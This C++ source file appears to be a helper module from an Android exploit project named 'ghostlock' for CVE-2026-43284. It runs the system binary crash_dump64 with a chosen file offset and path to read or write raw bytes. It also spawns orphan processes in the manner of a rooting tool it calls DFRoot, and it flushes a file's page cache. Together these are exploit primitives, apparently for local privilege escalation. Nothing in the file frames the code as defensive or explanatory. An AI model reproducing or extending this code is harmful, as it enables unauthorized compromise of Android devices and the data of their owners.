#include "backend/cve_2026_43284/lib/helper.hpp"
#include "support/gl_log.h"

#include <fcntl.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cerrno>
#include <cstdio>
#include <cstring>

namespace ghostlock::backend::cve_2026_43284::lib {
namespace {
constexpr const char *kCrashDump = "/apex/com.android.runtime/bin/crash_dump64";

void set_error(HelperError *error, const char *stage) noexcept {
    if (error == nullptr) return;
    error->stage = stage;
    error->err = errno;
}

void exit_child(int fd, const char *offstr, const char *path, bool read_mode) noexcept {
    /* vfork child: only async-signal-safe dup2/exec/_exit, no snprintf/malloc. */
    const int target_fd = read_mode ? STDIN_FILENO : STDOUT_FILENO;
    if (fd != target_fd && ::dup2(fd, target_fd) < 0) _exit(1);
    if (read_mode) ::execl(kCrashDump, "crashdump64", offstr, path, "r", nullptr);
    else ::execl(kCrashDump, "crashdump64", offstr, path, nullptr);
    _exit(1);
}
}  // namespace

bool gl_helper_exec(off_t offset, const char *path, int out_fd, bool read_mode,
                    HelperError *error) noexcept {
    verbose("gl_helper_exec offset=%ld path=%s fd=%d read=%d", static_cast<long>(offset),
            path != nullptr ? path : "(null)", out_fd, read_mode ? 1 : 0);
    if (error != nullptr) { error->stage = nullptr; error->err = 0; error->status = 0; }
    if (path == nullptr || out_fd < 0) {
        debug("gl_helper_exec branch=args-invalid");
        if (error != nullptr) { error->stage = "helper-args"; error->err = EINVAL; }
        return false;
    }
    char offstr[24];
    std::snprintf(offstr, sizeof(offstr), "%ld", static_cast<long>(offset));
    /* vfork + parent-side formatting: the child must not touch libc locks after
     * fork in a multi-threaded ART process. */
    const pid_t pid = ::vfork();
    if (pid < 0) {
        debug("gl_helper_exec branch=vfork-failed errno=%d", errno);
        set_error(error, "helper-fork");
        return false;
    }
    if (pid == 0) exit_child(out_fd, offstr, path, read_mode);
    int status = 0;
    pid_t waited = -1;
    do {
        waited = ::waitpid(pid, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited < 0) {
        debug("gl_helper_exec branch=wait-failed errno=%d", errno);
        set_error(error, "helper-wait");
        return false;
    }
    if (error != nullptr) error->status = status;
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        debug("gl_helper_exec branch=child-exit status=%d", status);
        if (error != nullptr) { error->stage = "helper-exit"; error->err = 0; }
        return false;
    }
    debug("gl_helper_exec branch=ok status=%d", status);
    return true;
}

bool gl_helper_read(const char *path, off_t offset, std::uint8_t out[16],
                    HelperError *error) noexcept {
    verbose("gl_helper_read path=%s offset=%ld", path != nullptr ? path : "(null)", static_cast<long>(offset));
    if (error != nullptr) { error->stage = nullptr; error->err = 0; error->status = 0; }
    if (path == nullptr || out == nullptr) {
        debug("gl_helper_read branch=args-invalid");
        if (error != nullptr) { error->stage = "helper-read-args"; error->err = EINVAL; }
        return false;
    }
    int pipe_fds[2] = {-1, -1};
    if (::pipe(pipe_fds) < 0) { debug("gl_helper_read branch=pipe-failed errno=%d", errno); set_error(error, "helper-read-pipe"); return false; }
    const bool ran = gl_helper_exec(offset, path, pipe_fds[1], true, error);
    ::close(pipe_fds[1]);
    ssize_t n = -1;
    if (ran) n = ::read(pipe_fds[0], out, 16);
    ::close(pipe_fds[0]);
    if (!ran) return false;
    if (n != 16) {
        debug("gl_helper_read branch=short n=%zd", n);
        if (error != nullptr) { error->stage = "helper-read-short"; error->err = EIO; }
        return false;
    }
    debug("gl_helper_read branch=ok bytes=%zd", n);
    return true;
}


bool gl_trigger_orphan(unsigned delay_ms, HelperError *error) noexcept {
    verbose("gl_trigger_orphan delay_ms=%u", delay_ms);
    if (error != nullptr) { error->stage = nullptr; error->err = 0; error->status = 0; }
    const pid_t child = ::fork();
    if (child < 0) { debug("gl_trigger_orphan branch=fork-failed errno=%d", errno); set_error(error, "orphan-fork"); return false; }
    if (child == 0) {
        const pid_t grandchild = ::fork();
        if (grandchild < 0) _exit(1);
        if (grandchild == 0) {
            ::usleep(delay_ms * 1000U);
            _exit(0);
        }
        _exit(0);
    }
    /* Reap the intermediate child like DFRoot; the grandchild remains the orphan. */
    int status = 0;
    while (::waitpid(child, &status, 0) < 0 && errno == EINTR) {
    }
    return true;
}

bool gl_fadvise_drop(const char *path, HelperError *error) noexcept {
    if (error != nullptr) { error->stage = nullptr; error->err = 0; error->status = 0; }
    if (path == nullptr) {
        if (error != nullptr) { error->stage = "fadvise-args"; error->err = EINVAL; }
        return false;
    }
    const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) { set_error(error, "fadvise-open"); return false; }
#if defined(__linux__)
    const int rc = ::posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#else
    /* Host build has no page-cache drop; Android is the only real caller. */
    const int rc = 0;
#endif
    ::close(fd);
    if (rc != 0) {
        if (error != nullptr) { error->stage = "fadvise-drop"; error->err = rc; }
        return false;
    }
    return true;
}

}  // namespace ghostlock::backend::cve_2026_43284::lib
